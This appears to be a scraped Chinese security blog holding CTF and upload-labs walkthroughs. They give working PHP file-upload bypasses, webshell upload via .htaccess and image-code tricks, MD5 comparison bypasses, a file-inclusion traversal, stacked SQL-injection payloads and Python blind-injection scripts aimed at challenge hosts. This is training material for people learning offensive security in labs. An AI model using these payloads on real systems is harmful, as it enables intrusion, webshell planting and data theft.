（3）爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"BJDCTF2020_Easy_MD5","date":"2022-03-14T11:58:42.000Z","path":"2022/03/14/BJDCTF2020-Easy-MD5/","text":"BUU-BJDCTF2020_Easy_MD5（1）前言 博主今天来刷一刷之前从未碰过的md5题型。 本题的主要知识点是： a.password=md5($pass,true)绕过 b.MD5的弱碰撞 c.md5强比较 （2）打开界面，在窗口随便传点值 首先我们发现了地址栏处出现了get传值 leveldo4.php?password=123 打开bp看一看，我们发现了一行hint（暗示） 这里我去参考了一些师傅的wp，得到了几个万能钥匙。 ffifdyop 由于ffifdyop对应的16位原始二进制的字符串就是’or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c ，这个字符串前几位刚好是’ or ‘6。 select * from &#39;admin&#39; where password = &#39; &#39; or &#39;6....&#39; （3）转跳到下一步，bp抓包一下观察到 &lt;!-- $a = $GET[&#39;a&#39;]; $b = $_GET[&#39;b&#39;]; if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend. 这是一个MD5的弱类型比较 令a与b的值不相同，md5的值相同 网上找了些md5值相同的数（由于这些数MD5的值为0e，在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。） QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 payload：?a=s1885207154a&amp;b=0e509367213418206700842008763514 （4）转跳到另一个新的页面 &lt;?php error_reporting(0); include &quot;flag.php&quot;; highlight_file(__FILE__); if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123; echo $flag; &#125; 这里是===强比较，因为md5解析不了数组我们可以构造数组绕过 payload：param1[]=1&amp;param2[]=2 爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"php数组不为连续数问题","date":"2022-03-11T14:05:18.000Z","path":"2022/03/11/php数组不为连续数问题/","text":"php数组下标不为连续数问题（1）前言 这个问题是博主在刷upload靶场时遇到的。 （2）问题描述 这里博主分别定义了a[0]与a[2]并赋值，然后计算a这个数组共有多少的元素并打印，同时打印a[2]; 如果a为数组，又因为a[1]并没有进行赋值，则按理来说会自动赋予空字符。因此用count函数去计算a数组的元素返回值应为3，但却返回了2。 （3）问题的解决 这可能是博主php的代码不过关。遇到了这个问题博主立刻去恶补了一下php数组的知识，了解到了一下特性。 php数组特点（以下内容参考黑马程序员的相关教程） （1）可以整数下标或者字符串下标 如果数组下标都为整数：索引数组 如果数组下标都为字符串：关联数组 （2）不同下标可以混合存在：混合数组 （3）数组元素的顺序以放入顺序为准，跟下标无关 （4）数字下标的自增长特性：从0开始自动增长，如果中间手动出现较大的，那么后面的自增长元素从最大的值+1开始 （5）特殊值下标自动转换 （7）php数组元素没有类型限制 （8）php数组元素没有长度限制 （9）php中的数组是很大的数据，所以存储的位置是堆区，为当前数组分配一块连续的内存。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"upload_labs","date":"2022-03-03T12:32:40.000Z","path":"2022/03/03/upload-labs/","text":"upload_labs前言：博主之前因为一些其它的事一直拖拉，终于在这几天把这个靶场完成了。 博主建议过这关靶场时最好自己搭建环境，对于操作和改靶场的bug比较方便。 靶场链接：https://github.com/c0ny1/upload-labs（bug有点小多，一些需要自己去修改） 博主是在windows+apache2.4的环境搭建的。（建议用windows搭建） pass1（1）打开页面 js（JavaScript）检查属于前端验证，在浏览器未提交数据时进行验证。我们可以利用Burp suite来拦截请求，通过修改请求来绕过前端的JavaScript验证，并成功地向服务器提交了数据。 前端JavaScript验证是为了防止用户输入错误，服务器端验证是为了防止恶意攻击。 （2）先用png文件格式绕过js验证，用bp抓包、改包，改为php绕过。 （3）用蚁剑链接 pass2（1）提示 （2）上传php文件，bp抓包，写码，修改数据包的MIME if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) 由码源知道需要以上的格式。 （3）用蚁剑链接 pass3（1）提示 $deny_ext = array(‘.asp’,’.aspx’,’.php’,’.jsp’); 后缀过滤不严，我们只需要把.php后缀修改为.phtml即可 （2）bp抓包修改 （3）蚁剑连接 pass4（1）提示 这很明显没有对文件后缀名进行详细的过滤。 （2）利用.htaccess文件修改png文件的后缀 //.htaccess文件内容 &lt;FilesMatch &quot;1.png&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 注：要对apache进行配置，一般的apache关闭了.htaccess文件的使用。 （3）先上传.htaccess文件，在上传带一句话木马的png文件，便会被当作php文件解析 （4）蚁剑连接 注：这里还可以使用开发者工具来查看图片上传的地址 pass5（1）提示 $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 由于php代码是按由上倒下的顺序执行的，并且deldot、trim函数只执行一次操作。于是我们可以把.php改为.php. .进行绕过。 （2）bp抓包，改后缀 （3）蚁剑连接 pass6（1）提示 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 （2）没有进行大小写过滤 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 把.php改为.Php绕过。 （3）用蚁剑连接 pass7（1）提示 $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 没有过滤到文件末尾的空格，我们可以利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php （末尾有一个空格） （2）bp抓包，修改后缀 （3）蚁剑连接 pass8（1）提示 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 少了去“.”，同样我们可以利用Windows系统的文件名特性。文件名后缀改成php . （2）bp抓包，修改后缀 （3）蚁剑连接 pass9（1）提示 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 少了去字符串::$DATA，我们可以利用Windows系统的文件名特性。在windows中，会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，起到绕过后端检测的效果。 （2）bp抓包，修改后缀 （3）蚁剑连接 由于在windows中只会保持::$DATA之前的文件名，所以用蚁剑连接时，要去掉::$DATA pass10（1）提示 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 …… $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; 与前面几关一样，我们可以利用Windows系统的文件名特性。原文件改成php. .绕过 （2）bp抓包，修改后缀 （3）蚁剑连接 pass11（1）提示 既然会去除后缀，那我们不妨尝试一下双写的技巧。把后缀改成.pphphp （2）bp抓包，修改后缀 （3）蚁剑连接 pass12（1）提示 $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 分析代码，这是以时间戳的方式对上传文件进行命名，使用上传路径名%00截断绕过，不过这需要对文件有足够的权限，比如说创建文件夹，上传的文件名写成1.jpg, save_path改成…/upload/1.php%00，最后保存下来的文件就是1.php url中，%00对应的ascii码值为0，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片 （2）bp抓包修改 （3）蚁剑连接 当url中出现%00时就会认为读取已结束，所以连接蚁剑时，会自己保存%00以前的内容 ps.php版本要小于5.3.4，magic_quotes_gpc需要为Off状态。可在php的配置文件中修改。pass13 (1)提示 原理与前一关一样，区别在于前一关采用的是get的方式，这一关用的是post的方式，我们同样可以在bp的hex拦中进行修改。我们在Hex中找到对应的十六进制码（php的十六进制码为70 68 70），因此我们将在这串编码后的值更改为00。 （2）bp抓包修改 先把php文件的后缀改为jpg，upload后加上1.php使文件被解析成php文件 然后修改hex的值 （3）蚁剑连接 pass14（1）提示 function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); //把这两字节分别放入数组&quot;C2chars&quot; $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); //将字节转化为二进制流 $fileType = &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; &#125; return $fileType; &#125; 源码通过二进制的方式查看文件前2字节(文件头)是否为合法文件。 一般而言jpg、png、gif这类格图片格式的前几个字符（16进制下）都是一样的，有些防护手段也是通过这种特征码来判断的。所以我们可以通过构造图片码绕过。 注：图片码的制作 a.先将准备好的图片与php代码放入同一文件夹 b.打开cmd，cd到指定文件夹 c.执行cmd指令: copy 1.jpg /b + 1.php /a 2.jpg 注：识别图片格式的方法https://www.jb51.net/article/205800.htm （2）制作图片码上传 因为蚁剑连接不了图片，所以我们用phpinfo这个命令来判断我们成功渗透。 （3）利用文件包含漏洞，触发图片码 这里博主搭建的靶场是有漏洞的，upload文件夹里的文件包含漏洞文件会被删除，博主也懒得去找原因，直接复制根目录的文件包含漏洞的文件到upload文件中。 pass15（1）提示 function isImage($filename)&#123; $types = &#39;.jpeg|.png|.gif&#39;; if(file_exists($filename))&#123; $info = getimagesize($filename);//获取图片大小，返回的结果是数组 $ext = image_type_to_extension($info[2]);//取得图像类型的文件后缀 if(stripos($types,$ext)&gt;=0)&#123; //查找字符串首次出现的位置 return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125; &#125; （2）与上一关的方法相同，上传图片码绕过 pass16（1）提示 function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename);//通过exif_imagetype函数检测是否图片格式正确 switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125; &#125; （2）也同样与14关方法相同，上传图片码 pass17（1）提示 else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125; &#125; 这一关主要考的是二次渲染，我们可以利用gif文件的特性，gif文件在二次渲染之后会保留一段和渲染前相同的内容，而jpg与png则没有这段内容。 （2）我们先制作gif的图片码，上传，在把上传后的图片下载下来，用010editor比较不同由于博主之前就把码注入到不变的位置，所以渲染后的图片，仍保存这一段代码。 （3）利用文件包含，触发图片码 pass18（1）提示 if(move_uploaded_file($temp_file, $upload_file))&#123; //move_uploaded_file() 函数把上传的文件移动到新位置。 if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#39;上传出错！&#39;; &#125; 本关先通过move_uploaded_file（）移动文件到指定的位置，再对文件后缀进行检查。合法，就重命名；不合法，就用unlink函数删掉。也就是说只要我们在move_uploaded_file（）移动文件后，经行后缀判断前，读取文件，注入webshell就可以了。 （2）bp不停发送文件。 上传文件创建新后门的文件 &lt;?php ?&gt;&#39;);?&gt; fputs — fwrite() 的别名 fwrite — 写入文件，这里的意思是把’‘的内容写入1.php这个文件中，由于upload文件中不存在1.php这个文件利用了fopen这个函数，来创建1.php这个文件。 fopen() - 打开文件或者 URL，将 filename 指定的名字，资源绑定到一个流上。 fopen( string $filename, string $mode, bool $use_include_path = false, resource $context = ?) : resource ‘w’ 写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。 注：执行这些函数要有文件的读写权限 （3）用python脚本不断读取文件实现通过这样的条件竞争来实现注入 利用python程序中的request模块，不断访问第一次发送的文件，使之创造出新的后门文件。如果成功访问新建的后门文件，则代码执行成功。 # python脚本 import requests url_1 = &quot; http://192.168.3.243:81/upload/include.php?file=2.jpg &quot; url_2 = &quot; http://192.168.3.243:81/upload/1.php &quot; while True: html_1 = requests.get(url_1) html_2 = requests.get(url_2) if html_1.status_code == 200: print(&quot;1&quot;) if html_2.status_code == 200: print(&quot;YES&quot;) break else: print(&quot;NO&quot;) （4）实际操作 出现了yes就代表成功了。 （5）接下来就直接用蚁剑去连接 pass19等待更新 pass20（1）提示 $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; pathinfo( string $path, int $flags = PATHINFO_ALL) : array|string pathinfo() 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 flags。 flag: PATHINFO_DIRNAME - 只返回 dirname PATHINFO_BASENAME - 只返回 basename PATHINFO_EXTENSION - 只返回 extension PATHINFO_FILENAME - 只返回 filename pathinfo() 纯粹基于输入字符串操作，它不会受实际文件系统和类似 “..” 的路径格式影响。 我们可以利用这点，把.php的后缀改成”.php. ”，这样返回的后缀就会绕过后缀检查，而多出来的”. “，就会被windows系统的文件名特性忽略掉，从而成功上传文件。 （2）修改保存的名称 （3）用蚁剑连接 pass21（1）提示 if(!empty($_FILES[&#39;upload_file&#39;]))&#123; //检查MIME $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;); if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名，检查&#39;save_name&#39;的值是否为空，如果为空则flie的值为上传文件的名字，否则为&#39;save_name&#39;的值。 $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; if (!is_array($file)) &#123; //如果file的值不是数组，使用explode函数用“.”分割$file的值为两部分，其返回值是数组。 //strtolower函数则是使file的值转化为小写。 $file = explode(&#39;.&#39;, strtolower($file)); &#125; $ext = end($file); //end()取file数组的最后一行 $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; //reset函数是使指向$file的指针，重返初始位置，并返回第一个的值 //count — 计算数组中的单元数目 $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]; //$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称 $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; …… 首先要绕过MIME的检查，这个我们通过bp抓包修改Content-Type:的值就可以了。然后savename的值如果不是数组则会被拆为数组，那不妨我们直接构造一个数组传给file。 同时我们可以利用php数组下标不不为连续数问题（可详细参考博主的下一篇博客） 传入： save_name[0]=1.php save_name[2]=jpg 这样save_name[2]=jpg用于绕过后缀检查，而count函数计算出来的值为2，所以$file[count($file) - 1]也就是$file[1]的返回值为空，最后$img_path的值也就为1.php.，在通过windows的文件名特性会忽略掉最后的“.”，就成功上传了 （2）用蚁剑连接","tags":[{"name":"靶场","slug":"靶场","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"[SUCTF 2019]EasySQL","date":"2022-02-23T12:03:01.000Z","path":"2022/02/23/[SUCTF 2019]EasySQL/","text":"[SUCTF 2019]EasySQL要点： a.堆叠注入。 b.||在oracle和mysql数据库功能的联想，sql_mode=pipes_as_concat的使用。 c.猜测后端语句。（较难） （1）打开靶场，简单测试一下 payload 1 页面正常回显 1&#39; 页面无回显 1&#39; or 1=1 回显nonono（猜测可能被过滤掉了一些东西） （2）用fuzz字典扫一下 好家伙，好多关键词被过滤了。 注：这里博主的字典不全漏了union（后面手工注入才发现） 用不了union联合查询注入，where关键词也被过滤了，只剩下堆叠注入可以尝试一下； （3）尝试一下堆叠注入 好像还真可以 1；show databases; 1; show tables; 我去，到了列这里出了问题。 试了一下，from和Flag都被过滤掉了；试了一些方法绕不过去； （4）没办法，去找了一下大佬的wp 据大佬给出的wp，他给出的解释是想让做题的人去猜测后端语句。 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。 （5）解法 解法1：既然select post进去的数据||flag from Flag，那不妨通过修改SQL配置将或运算符||设置为连接符。 结合堆叠注入，构造payload（oracle 支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 不支持。mysql可以通过更改sql_mode=pipes_as_concat来使 || 用作拼接的作用。） 1;set sql_mode=PIPES_AS_CONCAT;select 1 得到flag 解法2： 大佬给的另一种解法 如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容 payload *,1 这里也是利用了||的或功能，1||flag的返回值是1；","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"[GXYCTF2019]BabyUpload","date":"2022-02-22T11:42:49.000Z","path":"2022/02/22/GXYCTF2019_BabyUpload/","text":"[GXYCTF2019]BabyUpload（1）先随便上传png文件看看 好像不行 （2）抓包，写一句话木马，不断改后缀，直到jpeg好像传上去了。 （3）后缀改成php看看ph的后缀好像都不行 （4）这时候就要用.htaccess文件把后缀直接更改成php文件 （5）抓包改Content-Type:image/jpeg绕过filename后缀不要动！只要改改Content-Type:image/jpeg就可以。 博主设置的.htaccess文件是把带png后缀的文件改为php文件，博主之前也把filename后缀改为jpeg以致一直连接不上蚁剑。 （6）最后用蚁剑连接，再根目录下找到flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sql注入--堆叠注入","date":"2022-02-22T08:56:50.000Z","path":"2022/02/22/sql注入-堆叠注入/","text":"sql注入–堆叠注入（1）原理Stacked injection 汉语翻译过来后，国内有的称为堆查询注入，也有称之为堆叠注入。在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续执行分号后面的下一条语句。 堆叠注入的作用是同时执行多条任意语句，而union联合注入合并执行的语句有限，可以用来执行查询语句。 （2）堆叠注入的局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 注：Mysql、Sql server、Postgresql可执行堆叠注入，Oracle不行。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"[HCTF 2018]WarmUp","date":"2022-02-11T12:31:07.000Z","path":"2022/02/11/[HCTF 2018]WarmUp/","text":"[HCTF 2018]WarmUp（1）开局一张滑稽脸。 （2）查看源代码，得到提示 （3）打开提示页面，又获得一个提示页面 （4）看看另外一个提示的页面提示了flag在ffffllllaaaagggg （5）回到sourch.php页面简单解读一下源码 &lt;?php highlight_file(__FILE__);//highlight_file()函数输出一个突出显示PHP语法的文件。（打印以下代码） class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];//定义一个白名单 if (! isset($page) || !is_string($page)) &#123; //判断$page是否不为空或是否不是字符串，是则返回false和打印&quot;you can&#39;t see it&quot;。 echo &quot;you can&#39;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; //从$whitelist中查找是否有$page有则返回true return true; &#125; $_page = mb_substr( //截取参数中的?之前的一部分，如果没有?则，截取所有参数。 $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) //$page . &#39;?&#39;是指$page的值与？拼接在一起 ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page);//定义$_page的值为$page的url解码（说实话这步解码觉得没啥意义） $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#39;file&#39;])//要求传入的 file变量的值需要满足：非空，字符串，能通过 checkFile()函数 &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) &#123; include $_REQUEST[&#39;file&#39;]; //包含$_REQUEST[&#39;file&#39;]文件 exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; //打印滑稽表情 ?&gt; 即要给参数file传值，要求传入的 file变量的值需要满足：非空，字符串，能通过 checkFile()函数。 （6）构造file的值 a.符合whitelist里面的值file=hint.php/source.php（两个都可以） b.第一个判断$page是否在$whitelist数组中，无论有没有并不会影响file通过 checkFile()函数，所以可以忽略不计。 c.看到include 和上面的checkfile我们就很敏感的得知是利用include。我们知道如果直接放入hint.php？ffffllllaaaaggg会通过checkFile的验证返回true，但是毫无疑问这种错误的文件名是无法被include正确读取的，所以正确为hint.php?/ffffllllaaaagggg。 d.截取$page中’?’前一部分判断是否$whitelist数组中 ，判断url解码并截取了’?’前一部分的$page是否存在于$whitelist中；(‘?’url解码后还是’?’,影响不大) e.初步猜测为 ?file=hint.php？/ffffllllaaaagggg f.经过测试发现无返回值，这可能是因为我们不知道ffffllllaaaagggg文件存放的具体位置,所以依次增加../（不断返回上一级目录）,最终成功拿到flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"[ACTF2020 新生赛]Upload1","date":"2022-02-10T14:56:18.000Z","path":"2022/02/10/新生赛-Upload1/","text":"[ACTF2020 新生赛]Upload1（1）很明显文件上传题 （2）上传文件 先随便传个jpg文件看看 （3）用burp suite抓包，写一句话木马，改后缀名加入较为常见的一句话木马：改jpg的后缀（常见的后缀有php、php3、php4、php5、php7、pht、phtml、phps），尝试到phtml成功。 （4）路径页面也回显了，直接用蚁剑连接在根目录下找到flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sql注入脚本——二分法","date":"2022-02-05T10:35:29.000Z","path":"2022/02/05/sql注入脚本——二分法/","text":"二分法相较于一个一个字母测试sql注入的python脚本来说，二分法可以带来更高效的，更全面的结果。 分析先来看一个脚本的片段 for i in range(1,10000): low = 32 high = 128 mid = (low+high)//2 while low &lt; high: # url = host + &quot;id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&lt;%d)^1&quot; % (i,mid) # res = requests.get(url) url = host + &quot;id=1&#39;^(ascii(substr((select(group_concat(password))from(users)),%d,1))&lt;%d)^1-- -&quot; % (i,mid) res = requests.get(url) if &quot;You are in&quot; in res.text: high = mid else: low = mid+1 mid = (low + high)&gt;&gt;1 if mid &lt;= 32 or mid &gt;= 127: break 这个脚本是把二分法应用到sql盲注中。 过程： （1）查找范围 low = 32 high = 128 对照ascii码表从32位（空格）到128位（€欧盟的符号），其中包含了数字，大小写字母，及部分常见符号，范围很广。 （2）查找过程 除了最高位和最低位，还设置了一个中间值。 定义完变量，开始测试。 for i in range(1,10000): low = 32 high = 128 mid = (low+high)//2 while low &lt; high: url = host + &quot;id=1&#39;^(ascii(substr((select(group_concat(password))from(users)),%d,1))&lt;%d)^1-- -&quot; % (i,mid) res = requests.get(url) if &quot;You are in&quot; in res.text: high = mid else: low = mid+1 mid = (low + high)&gt;&gt;1 if mid &lt;= 32 or mid &gt;= 127: break 判断password的第i位是否小于mid，如果出现页面回显”You are in”（代表小于），然后把mid的值赋给high；如果页面回显出其他东西（代表大于），则把mid加1的值赋值给low。然后mid再重新计算（mid = (low + high)&gt;&gt;1，low和high的总和向右位移1位，可以相当于这个总和除二）。通过while循环把查找的范围不断缩小，不断接近所要查找的那个值，最后high等于low等于所要查找的那个值，不满足while low &lt; high跳出循环，打印出找到的那个值。 如果把上述的low=mid+1改为low=mid也可以","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"极客大挑战finalsql","date":"2022-01-28T13:00:45.000Z","path":"2022/01/28/极客大挑战finalsql/","text":"极客大挑战finalsql（1）打开页面 （2）先对首页的用户名和密码经行过滤检查发现了select，and，from，where等重要的关键词被过滤掉，无法进一步进行sql注入 （3）查找一下其他的线索一个一个点进去，从id=1到id=6，然后被耍了！ 不过可以猜测，id后面应该可以进行sql注入。 （4）对id后的值经行过滤检查 这里的关键字没有被过滤掉可以进行sql，此外发现页面回显的结果只有“ERROR！！！”和“你可别被我逮住了，臭弟弟”结合首页的提示要使用sql盲注。 （5）写一下python脚本 利用requests库中的get请求写脚本。 import requests url = &#39;http://d8033658-fcc1-4e69-bf4f-a356e0510af8.node4.buuoj.cn:81/search.php&#39; flag = &#39;&#39; for i in range(1,250): low = 32 high = 128 mid = (low+high)//2 while(low&lt;high): #payload = &#39;http://d8033658-fcc1-4e69-bf4f-a356e0510af8.node4.buuoj.cn:81/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#39; %(i,mid) payload = &quot;http://d8033658-fcc1-4e69-bf4f-a356e0510af8.node4.buuoj.cn:81/search.php?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)&quot; %(i,mid) r = requests.get(url=payload) if &#39;ERROR&#39; in r.text: low = mid+1 else: high = mid mid = (low+high)//2 if(mid ==32 or mid ==127): break flag = flag+chr(mid) print(flag) 